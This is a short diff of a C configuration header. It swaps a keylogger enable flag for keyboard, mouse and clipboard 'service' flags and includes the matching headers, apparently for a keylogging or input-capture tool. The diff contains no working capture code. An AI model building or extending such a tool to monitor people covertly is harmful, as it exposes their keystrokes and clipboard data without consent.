@@ -1,10 +1,20 @@
 #pragma once
 
+// Services
+#define KEYBOARD_SERVICE true
+#define MOUSE_SERVICE true
+#define CRIPBOARD_SERVICE true
+
 // Keylogger settings
-#define KEYLOGGER_ENABLED true
 #define KEYLOGGER_MAX_REPEATS 10
 
 // Includes
-#if KEYLOGGER_ENABLED
-#include "keylogger.h"
-#endif // KEYLOGGER_ENABLED
+#if KEYBOARD_SERVICE
+#include "keyboard.h"
+#endif
+#if MOUSE_SERVICE
+#include "mouse.h"
+#endif
+#if CRIPBOARD_SERVICE
+#include "clipboard.h"
+#endif
